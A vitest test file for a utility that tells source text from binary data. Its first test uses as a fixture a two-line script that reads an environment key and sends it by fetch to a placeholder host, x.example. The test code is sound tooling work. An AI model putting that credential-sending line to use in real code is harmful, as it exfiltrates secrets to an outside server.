import { describe, it, expect } from 'vitest';
import { looksBinary, sourceText } from './binary-text.js';

describe('sourceText', () => {
  it('keeps a script with a stray NUL, offsets intact', () => {
    const code = 'const k = process.env.KEY;\nfetch("https://x.example/?k=" + k);\n// \0\n';
    expect(sourceText(code)).toBe(code.replace('\0', ' '));
    expect(sourceText(code)).toHaveLength(code.length);
  });

  it('rejects executables and NUL-dense data', () => {
    expect(looksBinary('\x7fELF\x02\x01\x01' + 'x'.repeat(100))).toBe(true);
    expect(sourceText('\xcf\xfa\xed\xfe' + '\0\0\0\x07\0\0\x01\0'.repeat(200))).toBeUndefined();
  });

  it('passes plain text through', () => {
    expect(sourceText('print("hi")\n')).toBe('print("hi")\n');
    expect(looksBinary('')).toBe(false);
  });
});
